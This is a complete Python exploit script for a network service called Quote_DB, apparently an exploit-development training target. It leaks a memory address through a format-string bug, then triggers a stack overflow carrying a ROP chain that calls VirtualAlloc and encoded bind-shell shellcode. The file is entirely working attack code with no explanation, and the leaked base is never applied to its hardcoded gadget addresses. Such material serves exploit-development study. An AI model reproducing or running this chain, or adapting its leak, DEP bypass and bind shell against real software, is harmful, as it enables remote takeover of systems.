#!/usr/bin/python3

# Quote_DB PoC
# William Moody, 07.06.2021

from functools import update_wrapper
import socket
import sys
from struct import pack, unpack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 3700

# ===

def send(opcode, data):
    buf  = pack("<I", opcode)
    buf += data

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    
    try:
        ret = s.recv(16384)
        s.close()

        return ret
    except:
        return None

# ===

def get_quote(index):
    return send(901, pack("<I", index))

def add_quote(quote):
    return send(902, quote)

def bad_request(buf):
    return send(800, buf)

# ===

print("[+] Getting base address...")

quote_id = unpack("<I", add_quote(b"%x " * 30))[0]
base_str = get_quote(quote_id).split(b" ")[2].decode()
base = (int(base_str, 16) // 0x10000) * 0x10000

print("    -- " + hex(base))

# ===

size = 5000
ropSize = 500

# ===

# bind shell

shellcode =  b""
shellcode += b"\x90" * 20
shellcode += b"\xb8\x3b\xcc\xbe\xaa\xdb\xd2\xd9\x74\x24\xf4\x5b\x33"
shellcode += b"\xc9\xb1\x53\x31\x43\x12\x83\xc3\x04\x03\x78\xc2\x5c"
shellcode += b"\x5f\x82\x32\x22\xa0\x7a\xc3\x43\x28\x9f\xf2\x43\x4e"
shellcode += b"\xd4\xa5\x73\x04\xb8\x49\xff\x48\x28\xd9\x8d\x44\x5f"
shellcode += b"\x6a\x3b\xb3\x6e\x6b\x10\x87\xf1\xef\x6b\xd4\xd1\xce"
shellcode += b"\xa3\x29\x10\x16\xd9\xc0\x40\xcf\x95\x77\x74\x64\xe3"
shellcode += b"\x4b\xff\x36\xe5\xcb\x1c\x8e\x04\xfd\xb3\x84\x5e\xdd"
shellcode += b"\x32\x48\xeb\x54\x2c\x8d\xd6\x2f\xc7\x65\xac\xb1\x01"
shellcode += b"\xb4\x4d\x1d\x6c\x78\xbc\x5f\xa9\xbf\x5f\x2a\xc3\xc3"
shellcode += b"\xe2\x2d\x10\xb9\x38\xbb\x82\x19\xca\x1b\x6e\x9b\x1f"
shellcode += b"\xfd\xe5\x97\xd4\x89\xa1\xbb\xeb\x5e\xda\xc0\x60\x61"
shellcode += b"\x0c\x41\x32\x46\x88\x09\xe0\xe7\x89\xf7\x47\x17\xc9"
shellcode += b"\x57\x37\xbd\x82\x7a\x2c\xcc\xc9\x12\x81\xfd\xf1\xe2"
shellcode += b"\x8d\x76\x82\xd0\x12\x2d\x0c\x59\xda\xeb\xcb\x9e\xf1"
shellcode += b"\x4c\x43\x61\xfa\xac\x4a\xa6\xae\xfc\xe4\x0f\xcf\x96"
shellcode += b"\xf4\xb0\x1a\x02\xfc\x17\xf5\x31\x01\xe7\xa5\xf5\xa9"
shellcode += b"\x80\xaf\xf9\x96\xb1\xcf\xd3\xbf\x5a\x32\xdc\xae\xc6"
shellcode += b"\xbb\x3a\xba\xe6\xed\x95\x52\xc5\xc9\x2d\xc5\x36\x38"
shellcode += b"\x06\x61\x7e\x2a\x91\x8e\x7f\x78\xb5\x18\xf4\x6f\x01"
shellcode += b"\x39\x0b\xba\x21\x2e\x9c\x30\xa0\x1d\x3c\x44\xe9\xf5"
shellcode += b"\xdd\xd7\x76\x05\xab\xcb\x20\x52\xfc\x3a\x39\x36\x10"
shellcode += b"\x64\x93\x24\xe9\xf0\xdc\xec\x36\xc1\xe3\xed\xbb\x7d"
shellcode += b"\xc0\xfd\x05\x7d\x4c\xa9\xd9\x28\x1a\x07\x9c\x82\xec"
shellcode += b"\xf1\x76\x78\xa7\x95\x0f\xb2\x78\xe3\x0f\x9f\x0e\x0b"
shellcode += b"\xa1\x76\x57\x34\x0e\x1f\x5f\x4d\x72\xbf\xa0\x84\x36"
shellcode += b"\xcf\xea\x84\x1f\x58\xb3\x5d\x22\x05\x44\x88\x61\x30"
shellcode += b"\xc7\x38\x1a\xc7\xd7\x49\x1f\x83\x5f\xa2\x6d\x9c\x35"
shellcode += b"\xc4\xc2\x9d\x1f"

# ===

rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x74f055f7,  # POP ESI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x0044a1e8,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x75dc47e1,  # MOV ESI,DWORD PTR DS:[ESI] # ADD AL,0 # MOV EAX,C00000BB # RETN 0x1C [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75109d8f,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x75cb7941,  # & call esp [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x74941455,  # POP EBX # RETN [mswsock.dll] ** REBASED ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x76ecd762,  # POP EDX # RETN [WS2_32.dll] ** REBASED ** ASLR 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x750e7c32,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x750eb981,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x75af9826,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x74eedace,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75cdb6af,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]

# python3
rop_gadgets = b"".join([pack('<I', _) for _ in rop_gadgets])

# ===

buf  = b"A" * 2060
buf += rop_gadgets
buf += shellcode
buf += b"C" * (ropSize - len(rop_gadgets))



# ===

print("[+] Triggering overflow...")

bad_request(buf)
